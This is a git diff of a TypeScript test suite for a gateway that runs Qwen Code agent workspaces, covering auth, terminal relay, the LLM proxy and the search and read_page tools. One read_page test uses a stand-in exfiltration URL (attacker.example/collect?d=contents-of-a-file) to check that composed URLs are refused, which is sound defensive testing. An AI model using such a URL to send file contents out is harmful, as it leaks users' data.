@@ -16,7 +16,6 @@ import { AGENT_UNKNOWN_GRACE_MS } from "../src/workspaces/policy.ts";
 import type { SettingsObject } from "../src/agents/qwen-settings.ts";
 import { WorkspaceImageMissingError } from "../src/docker/runtime.ts";
 import { formatResults, type SearchQuery } from "../src/service/search-mcp.ts";
-import { createServiceServer } from "../src/service/service-api.ts";
 import { closeServer, listenLocal } from "./fakes.ts";
 import {
   bearerSubprotocol,
@@ -24,6 +23,7 @@ import {
   cookie,
   json,
   logged,
+  mcp,
   MIN,
   request,
   startGateway,
@@ -78,8 +78,6 @@ function upgrade(token: string | null, userId: number, protocols?: string[]): Pr
   if (token) headers.cookie = cookie(token);
   return request(g.agentPort(userId), { path: "/terminal", headers });
 }
-
-// ------------------------------------------------------------------ signed out, stopped, origin, other users
 
 test("signed-out navigations get the themed page; other requests get 401", async () => {
   const { alice } = g.ids;
@@ -159,8 +157,6 @@ test("a session only gets into the workspace on its own user's port", async () =
   assert.equal((await g.navigate(g.tokens.admin, bob)).status, 403);
   assert.equal(g.runtime.starts.length, 0, "nothing was started");
 });
-
-// ------------------------------------------------------------------ start and proxy
 
 test("a page load starts nothing: a stopped workspace's port links to the portal, where the kind is chosen", async () => {
   const { alice } = g.ids;
@@ -431,8 +427,6 @@ test("uploads are streamed and limited", async () => {
   assert.ok(cut.bytes <= 1024 * 1024 + 128 * 1024);
 });
 
-// ------------------------------------------------------------------ WebSocket relay
-
 test("WebSocket /terminal: the token travels as a subprotocol and is swapped; the workspace's protocol is echoed", async () => {
   const { alice } = g.ids;
   const qwen = g.runtime.qwenFor(alice);
@@ -530,8 +524,6 @@ test("an admin reaches another user's workspace only while acting as them", asyn
   assert.equal((await viewer.next()).data.toString(), "hello from qwen /terminal");
   assert.deepEqual(g.info(alice).connections, { owner: 1, admin: 1 });
 });
-
-// ------------------------------------------------------------------ control API
 
 test("the control API requires the bearer token", async () => {
   assert.equal((await g.control("GET", "/control/health", undefined, "wrong-secret")).status, 401);
@@ -691,8 +683,6 @@ test("each run of a workspace is a session: it opens at Start and closes at the 
   assert.equal(sessionsOf().length, before + 1, "the stop closes it, adds none");
 });
 
-// ------------------------------------------------------------------ capacity and reaper
-
 test("start returns while Qwen Code boots; capacity 409 and eviction of an idle workspace", async () => {
   const { alice, bob, carol } = g.ids;
   const started = json<WorkspaceInfo>(await g.control("POST", `/control/workspaces/${alice}/start`));
@@ -766,8 +756,6 @@ test("the reaper stops workspaces whose sessions are all gone", async () => {
   assert.equal(g.info(carol).stopReason, "logout");
   g.tokens.carol = g.addSession(carol);
 });
-
-// ------------------------------------------------------------------ service API
 
 test("the LLM proxy streams, swaps the key and records usage", async () => {
   const { alice } = g.ids;
@@ -940,21 +928,11 @@ test("the LLM proxy only offers generation, embeddings and the model list", asyn
 });
 
 test("agent and service servers wait at most a minute for request headers, and never time out a request", () => {
-  const service = createServiceServer({ kind: "private", config: g.config, db: g.db, manager: g.manager, llm: g.llmQueue, requests: g.llmRequests, log: g.log, search: g.searches as never });
-  for (const server of [g.createAgentServer(), service]) {
+  for (const server of [g.createAgentServer(), g.createServiceServer({ kind: "private" })]) {
     assert.equal(server.headersTimeout, 60_000, "a client that never finishes its headers is dropped (slowloris)");
     assert.equal(server.requestTimeout, 0, "uploads, event streams and generations take as long as they take");
   }
 });
-
-function mcp(body: unknown): Promise<Reply> {
-  return request(g.ports.service, {
-    method: "POST",
-    path: "/mcp/search",
-    headers: { "content-type": "application/json", accept: "application/json, text/event-stream" },
-    body: JSON.stringify(body),
-  });
-}
 
 test("the service API answers the search MCP itself, from the search backend", async () => {
   const { alice } = g.ids;
@@ -962,13 +940,13 @@ test("the service API answers the search MCP itself, from the search backend", a
   g.clock.now += MIN;
   const before = g.info(alice).lastActivityAt;
 
-  const init = json<{ result: { serverInfo: { name: string } } }>(await mcp({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18" } }));
+  const init = json<{ result: { serverInfo: { name: string } } }>(await mcp(g, { jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18" } }));
   assert.equal(init.result.serverInfo.name, "workspace-portal-search");
-  const list = json<{ result: { tools: Array<{ name: string }> } }>(await mcp({ jsonrpc: "2.0", id: 2, method: "tools/list" }));
+  const list = json<{ result: { tools: Array<{ name: string }> } }>(await mcp(g, { jsonrpc: "2.0", id: 2, method: "tools/list" }));
   assert.deepEqual(list.result.tools.map((tool) => tool.name), ["web_search"]);
   assert.equal(g.info(alice).lastActivityAt, before, "only searches count as the agent working");
 
-  const call = await mcp({ jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "web_search", arguments: { query: " qwen code ", page: 2 } } });
+  const call = await mcp(g, { jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "web_search", arguments: { query: " qwen code ", page: 2 } } });
   assert.equal(call.status, 200);
   assert.deepEqual(json(call), { jsonrpc: "2.0", id: 3, result: { content: [{ type: "text", text: "results for qwen code" }] } });
   assert.deepEqual(g.searches.at(-1), { query: "qwen code", page: 2, timeRange: null, language: null });
@@ -976,12 +954,10 @@ test("the service API answers the search MCP itself, from the search backend", a
 
   g.caller.userId = null;
   const searches = g.searches.length;
-  const refused = await mcp({ jsonrpc: "2.0", id: 4, method: "tools/call", params: { name: "web_search", arguments: { query: "x" } } });
+  const refused = await mcp(g, { jsonrpc: "2.0", id: 4, method: "tools/call", params: { name: "web_search", arguments: { query: "x" } } });
   assert.equal(refused.status, 403);
   assert.equal(g.searches.length, searches, "unknown callers can't search");
 });
-
-// ------------------------------------------------------------------ failures and recovery
 
 test("a crashed container is noticed when the proxy can't reach it; the next page load says so and starts nothing", async () => {
   const { alice } = g.ids;
@@ -1074,8 +1050,6 @@ test("deleting a user's data stops the workspace and removes its directories", a
 test("nothing unexpected was logged as an error", () => {
   assert.deepEqual(g.errors(), ["workspace failed to start"], "only the simulated missing image");
 });
-
-// ------------------------------------------------------------------ lifecycle (a gateway per test)
 
 test("a working agent keeps its workspace past the idle timeout; it stops once health says idle", () =>
   withGateway({}, async (gw) => {
@@ -1226,7 +1200,7 @@ test("MAX_BUSY_HOURS: work stops counting that long after a person last did some
     assert.deepEqual(pick(gw.info(alice), ["busy", "busyReason"]), { busy: false, busyReason: null });
     // … and the agent's own requests (search, LLM) are activity, but not a person.
     gw.caller.userId = alice;
-    assert.equal((await mcpOn(gw, { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: "web_search", arguments: { query: "x" } } })).status, 200);
+    assert.equal((await mcp(gw, { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: "web_search", arguments: { query: "x" } } })).status, 200);
     assert.equal(gw.info(alice).lastActivityAt, gw.clock.now);
     assert.deepEqual(pick(gw.info(alice), ["busy", "idleSeconds"]), { busy: false, idleSeconds: 61 * 60 }, "idle since the person's last action");
 
@@ -1400,32 +1374,26 @@ test("while a user's data is being deleted no start gets through; a failed stop 
 test("the service API knows a workspace by its container's address, also once Docker gives that address to another", () =>
   withGateway({}, async (gw) => {
     const { alice, bob } = gw.ids;
-    // The real caller lookup (the shared harness server takes the caller from gw.caller instead).
-    const service = createServiceServer({ kind: "private", config: gw.config, db: gw.db, manager: gw.manager, llm: gw.llmQueue, requests: gw.llmRequests, log: gw.log, search: { search: async () => "" } });
-    const port = await listenLocal(service);
-    try {
-      const requests = (userId: number): number => gw.db.select().from(llmUsage).where(eq(llmUsage.userId, userId)).get()?.requests ?? 0;
-      const callFrom = (address: string): Promise<Reply> =>
-        request(port, { method: "POST", path: "/llm/v1/chat/completions", headers: { "content-type": "application/json" }, body: "{}", localAddress: address });
+    const requests = (userId: number): number => gw.db.select().from(llmUsage).where(eq(llmUsage.userId, userId)).get()?.requests ?? 0;
+    // The listener with the real caller lookup (ports.service takes the caller from gw.caller instead).
+    const callFrom = (address: string): Promise<Reply> =>
+      request(gw.ports.services.private, { method: "POST", path: "/llm/v1/chat/completions", headers: { "content-type": "application/json" }, body: "{}", localAddress: address });
 
-      await gw.startReady(alice);
-      const address = gw.runtime.qwenFor(alice).host;
-      assert.equal((await callFrom(address)).status, 200);
-      assert.equal(requests(alice), 1);
-      assert.equal((await callFrom("127.0.0.1")).status, 403, "no workspace has this address");
+    await gw.startReady(alice);
+    const address = gw.runtime.qwenFor(alice).host;
+    assert.equal((await callFrom(address)).status, 200);
+    assert.equal(requests(alice), 1);
+    assert.equal((await callFrom("127.0.0.1")).status, 403, "no workspace has this address");
 
-      // Alice's container dies unnoticed, and Docker gives its address to Bob's.
-      await gw.runtime.crash(alice);
-      await gw.startReady(bob);
-      assert.equal(gw.runtime.qwenFor(bob).host, address);
-      assert.equal((await callFrom(address)).status, 200);
-      assert.deepEqual([requests(alice), requests(bob)], [1, 1], "Bob's calls are Bob's");
-      assert.ok(logged(gw, "a workspace's address now belongs to another workspace"));
-      await waitFor(() => gw.info(alice).status === "stopped", "Alice's crash to be noticed");
-      assert.equal(gw.info(alice).stopReason, "error");
-    } finally {
-      await closeServer(service);
-    }
+    // Alice's container dies unnoticed, and Docker gives its address to Bob's.
+    await gw.runtime.crash(alice);
+    await gw.startReady(bob);
+    assert.equal(gw.runtime.qwenFor(bob).host, address);
+    assert.equal((await callFrom(address)).status, 200);
+    assert.deepEqual([requests(alice), requests(bob)], [1, 1], "Bob's calls are Bob's");
+    assert.ok(logged(gw, "a workspace's address now belongs to another workspace"));
+    await waitFor(() => gw.info(alice).status === "stopped", "Alice's crash to be noticed");
+    assert.equal(gw.info(alice).stopReason, "error");
   }));
 
 test("the session sweep closes connections of sessions that ended, or of an admin who moved on", () =>
@@ -1462,18 +1430,9 @@ test("a system-defaults.json without a model fails the start, naming the file", 
     assert.deepEqual([reply.status, json(reply)], [500, expected]);
     fs.rmSync(file);
     const missing = await gw.control("POST", `/control/workspaces/${alice}/start`);
-    assert.deepEqual([missing.status, json(missing)], [500, expected], "models are no longer configured in the environment");
+    assert.deepEqual([missing.status, json(missing)], [500, expected], "the environment configures no models");
     assert.equal(gw.runtime.starts.length, 0);
   }));
-
-function mcpOn(gw: Gateway, body: unknown): Promise<Reply> {
-  return request(gw.ports.service, {
-    method: "POST",
-    path: "/mcp/search",
-    headers: { "content-type": "application/json", accept: "application/json, text/event-stream" },
-    body: JSON.stringify(body),
-  });
-}
 
 test("read_page opens what a workspace was shown (search results, pages, its conversation) and trusted sites, nothing it composed", () => {
   const reads: Array<{ url: string; redirectHosts: readonly string[] | null | undefined }> = [];
@@ -1489,11 +1448,11 @@ test("read_page opens what a workspace was shown (search results, pages, its con
     const { alice, bob } = gw.ids;
     await gw.startReady(alice);
     const tool = async (name: string, args: unknown) =>
-      json<{ result: { content: Array<{ text: string }>; isError?: boolean } }>(await mcpOn(gw, { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name, arguments: args } })).result;
+      json<{ result: { content: Array<{ text: string }>; isError?: boolean } }>(await mcp(gw, { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name, arguments: args } })).result;
     const readPage = async (url: string): Promise<boolean> => (await tool("read_page", { url })).isError !== true;
 
     gw.caller.userId = alice;
-    const list = json<{ result: { tools: Array<{ name: string }> } }>(await mcpOn(gw, { jsonrpc: "2.0", id: 1, method: "tools/list" }));
+    const list = json<{ result: { tools: Array<{ name: string }> } }>(await mcp(gw, { jsonrpc: "2.0", id: 1, method: "tools/list" }));
     assert.deepEqual(list.result.tools.map((entry) => entry.name), ["web_search", "read_page"]);
 
     const composed = await tool("read_page", { url: "https://attacker.example/collect?d=contents-of-a-file" });
@@ -1562,15 +1521,15 @@ test("READER_URL_POLICY=any lets a workspace read every page; without a reader t
   };
   await withGateway({ env: { READER_URL: "http://127.0.0.1:9", READER_URL_POLICY: "any" }, reader }, async (gw) => {
     gw.caller.userId = gw.ids.alice;
-    const reply = json<{ result: { isError?: boolean } }>(await mcpOn(gw, { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: "read_page", arguments: { url: "https://anything.example/x?y=z" } } }));
+    const reply = json<{ result: { isError?: boolean } }>(await mcp(gw, { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: "read_page", arguments: { url: "https://anything.example/x?y=z" } } }));
     assert.equal(reply.result.isError, undefined);
     assert.deepEqual(reads, ["https://anything.example/x?y=z"]);
   });
   await withGateway({}, async (gw) => {
     gw.caller.userId = gw.ids.alice;
-    const list = json<{ result: { tools: Array<{ name: string }> } }>(await mcpOn(gw, { jsonrpc: "2.0", id: 1, method: "tools/list" }));
+    const list = json<{ result: { tools: Array<{ name: string }> } }>(await mcp(gw, { jsonrpc: "2.0", id: 1, method: "tools/list" }));
     assert.deepEqual(list.result.tools.map((entry) => entry.name), ["web_search"]);
-    const reply = json<{ result: { isError?: boolean } }>(await mcpOn(gw, { jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "read_page", arguments: { url: "https://docs.python.org/" } } }));
+    const reply = json<{ result: { isError?: boolean } }>(await mcp(gw, { jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "read_page", arguments: { url: "https://docs.python.org/" } } }));
     assert.equal(reply.result.isError, true);
   });
 });
@@ -1635,8 +1594,8 @@ test("after a gateway restart, a Qwen workspace nobody is using is adopted, not 
     const { alice } = gw.ids;
     await gw.startReady(alice);
     const container = gw.runtime.containerFor(alice).id;
-    // No session is open, so `qwen serve` has stopped its agent process. It starts it again for the
-    // next session. The gateway used to wait 90 s for that process and then remove the workspace.
+    // No session is open, so `qwen serve` has stopped its agent process; it starts it again for the next
+    // session. A workspace is not waited on, or removed, for a process it does not need yet.
     gw.runtime.qwenFor(alice).health.channelAlive = false;
 
     const fresh = await gw.restart();
